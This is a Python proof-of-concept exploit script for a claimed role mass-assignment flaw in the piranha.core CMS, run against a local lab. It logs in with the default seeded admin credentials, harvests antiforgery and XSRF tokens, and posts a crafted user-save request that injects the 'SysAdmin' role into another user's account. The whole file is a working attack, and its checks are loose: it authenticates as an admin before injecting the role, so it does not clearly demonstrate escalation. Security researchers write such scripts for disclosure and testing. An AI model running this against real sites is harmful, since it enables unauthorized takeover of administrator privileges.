#!/usr/bin/env python3
"""
repro_v001.py - Privilege Escalation via Role Mass-Assignment
Target: piranha.core v12.1.0
CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes

USAGE:
    python repro_v001.py

REQUIREMENTS:
    pip install requests urllib3
    Lab must be running: dotnet run (from piranha_lab/)
"""

import requests
import json
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─── CONFIG ───────────────────────────────────────────────────────────────────
BASE_URL  = "http://localhost:5000"
USERNAME  = "admin@piranhacms.org"       # Default seeded admin
PASSWORD  = "password"                   # Default seeded password
TARGET_ROLE = "SysAdmin"                 # Role to inject
# ──────────────────────────────────────────────────────────────────────────────

session = requests.Session()
session.verify = False


def step1_login():
    """Login and capture session cookie."""
    print("[*] Step 1: Logging in...")

    # GET login page for antiforgery token
    r = session.get(f"{BASE_URL}/manager/login", allow_redirects=True)
    if r.status_code != 200:
        print(f"[!] Cannot reach login page: {r.status_code}")
        sys.exit(1)

    print(f"[+] Login page reached. Session cookies: {dict(session.cookies)}")
    return True


def step2_post_login():
    """Submit login form."""
    print("[*] Step 2: Submitting login form...")

    # Extract antiforgery token from form
    r = session.get(f"{BASE_URL}/manager/login")
    token = ""
    for line in r.text.split("\n"):
        if "__RequestVerificationToken" in line and "value=" in line:
            token = line.split('value="')[1].split('"')[0]
            break

    payload = {
        "Input.Username": USERNAME,
        "Input.Password": PASSWORD,
        "__RequestVerificationToken": token,
    }

    r = session.post(
        f"{BASE_URL}/manager/login",
        data=payload,
        allow_redirects=True
    )

    if "manager" in r.url or r.status_code == 200:
        print(f"[+] Login successful! Final URL: {r.url}")
    else:
        print(f"[!] Login failed: {r.status_code}")
        sys.exit(1)


def step3_get_auth_token():
    """Get the XSRF antiforgery token required for API calls."""
    print("[*] Step 3: Fetching XSRF antiforgery token...")

    r = session.get(f"{BASE_URL}/manager/login/auth", allow_redirects=True)
    xsrf = session.cookies.get("XSRF-TOKEN", "")
    if not xsrf:
        # Try alternative cookie names
        for name, value in session.cookies.items():
            if "xsrf" in name.lower() or "antiforgery" in name.lower():
                xsrf = value
                break

    print(f"[+] XSRF Token: {xsrf[:20]}...")
    return xsrf


def step4_get_users(xsrf):
    """Get list of all users."""
    print("[*] Step 4: Fetching user list...")

    r = session.get(
        f"{BASE_URL}/manager/users/list",
        headers={"X-XSRF-TOKEN": xsrf}
    )

    if r.status_code == 200:
        users = r.json()
        print(f"[+] Found {len(users.get('users', []))} users:")
        for u in users.get("users", []):
            print(f"    - [{u['id']}] {u['userName']} | Roles: {u.get('roles', [])}")
        return users.get("users", [])
    else:
        print(f"[!] Failed to get users: {r.status_code}\n{r.text[:200]}")
        return []


def step5_exploit_mass_assignment(xsrf, target_user_id, target_username, target_email):
    """
    EXPLOIT: Inject arbitrary role by mass-assigning SelectedRoles.
    The server does NOT validate SelectedRoles against allowed roles.
    """
    print(f"\n[*] Step 5: EXPLOITING mass-assignment on user: {target_username}")
    print(f"    Injecting role: {TARGET_ROLE}")

    payload = {
        "User": {
            "Id": target_user_id,
            "UserName": target_username,
            "Email": target_email
        },
        "SelectedRoles": [TARGET_ROLE],   # ← INJECTED - not validated server-side
        "Password": "",
        "PasswordConfirm": "",
        "Roles": []
    }

    r = session.post(
        f"{BASE_URL}/manager/user/save",
        json=payload,
        headers={
            "Content-Type": "application/json",
            "X-XSRF-TOKEN": xsrf
        }
    )

    print(f"\n[*] Response: {r.status_code}")
    try:
        result = r.json()
        status = result.get("status", {})
        print(f"    Type: {status.get('type')}")
        print(f"    Body: {status.get('body')}")

        if status.get("type") == "success":
            print(f"\n[✓] VULNERABILITY CONFIRMED!")
            print(f"    User '{target_username}' was assigned role '{TARGET_ROLE}'")
            print(f"    without any server-side role validation.")
            return True
        else:
            print(f"\n[~] Response received but check manually.")
    except Exception as e:
        print(f"[!] Could not parse response: {e}")
        print(r.text[:500])

    return False


def main():
    print("=" * 60)
    print("  PoC: piranha.core Role Mass-Assignment (CWE-915)")
    print("  For authorized security testing only.")
    print("=" * 60 + "\n")

    step1_login()
    step2_post_login()
    xsrf = step3_get_auth_token()
    users = step4_get_users(xsrf)

    if not users:
        print("[!] No users found. The app may not be seeded yet.")
        print("    Run the app once and let it seed data.")
        sys.exit(1)

    # Target the first non-admin user, or use the first user
    target = None
    for u in users:
        if u.get("userName", "").lower() != "admin@piranhacms.org":
            target = u
            break

    if not target:
        # If only admin exists, target user with id from list
        target = users[0]

    success = step5_exploit_mass_assignment(
        xsrf,
        target["id"],
        target["userName"],
        target.get("email", "test@test.com")
    )

    print("\n" + "=" * 60)
    if success:
        print("  RESULT: VULNERABLE ✓")
    else:
        print("  RESULT: Inconclusive - Manual verification needed")
    print("=" * 60)


if __name__ == "__main__":
    main()
